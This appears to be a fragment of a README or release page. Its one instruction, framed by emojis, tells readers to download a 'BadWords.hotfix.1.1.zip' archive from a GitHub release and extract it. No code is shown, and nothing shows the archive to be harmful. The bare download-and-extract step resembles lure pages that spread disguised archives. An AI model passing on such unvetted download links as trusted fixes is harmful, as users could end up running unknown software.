...
Click 👉️ [here](https://github.com/veritus17/BadWords/releases/download/BadWords-fix/BadWords.hotfix.1.1.zip) 👈️ to download the latest release .zip package, and extract it into a folder
